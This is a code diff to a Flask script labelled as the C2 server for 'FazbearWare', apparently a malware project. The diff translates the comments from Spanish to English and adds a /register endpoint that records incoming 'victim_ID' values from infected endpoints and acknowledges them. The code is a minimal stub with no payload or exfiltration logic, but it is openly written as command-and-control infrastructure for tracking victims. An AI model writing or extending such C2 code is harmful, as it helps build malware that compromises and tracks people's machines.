@@ -2,16 +2,27 @@
 C2 SERVER 
 Description: 
 """
-from flask import Flask
+from flask import Flask,request
 
-# Creas la instancia de la aplicación
+# APP INSTANCE
 app = Flask(__name__)
 
-# Defines una "ruta": la dirección donde el servidor escuchará
+# PATHS
 @app.route('/')
 def home():
     return "FazbearWare C2 Server"
 
-# Ejecutas el servidor en localhost (127.0.0.1) y un puerto (ej. 5000)
+@app.route('/register',methods=['POST'])
+def victim_register():
+    data = request.get_json()
+    if data:
+        victim = data.get("victim_ID")
+        print(f"\n[!] Endpoint detected")
+        print(f"[!] Victim ID : {victim}")
+        return {"status": "success", "message": "ID OK"}, 200
+    return {"status": "error", "message": "No data send"}, 400
+
+    
+# EXECUTE SERVER IN LOCALHOST PORT 5000)
 if __name__ == '__main__':
     app.run(port=5000, debug=True)
